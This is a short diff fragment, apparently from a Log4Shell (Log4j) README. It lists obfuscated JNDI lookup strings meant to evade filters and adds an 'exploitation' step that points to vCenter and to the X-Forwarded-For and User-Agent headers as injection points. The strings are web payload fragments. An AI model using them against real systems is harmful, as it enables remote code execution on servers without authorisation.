@@ -22,7 +22,15 @@ j${main:\k5:-Nd}i${spring:k5:-:}
 j${sys:k5:-nD}${lower:i${web:k5:-:}} 
 j${::-nD}i${::-:} 
 j${EnV:K5:-nD}i: 
-j${loWer:Nd}i${uPper::} 
+j${loWer:Nd}i${uPper::}
+
+3.利用
+vcenter: 
+X-Forwarded-For: ${xx}
+
+User-Agent: 
+
+
 ```
 
 ![https://github.com/Nan3r/log4j/blob/main/README.assets/2.png](README.assets/2.jpg)
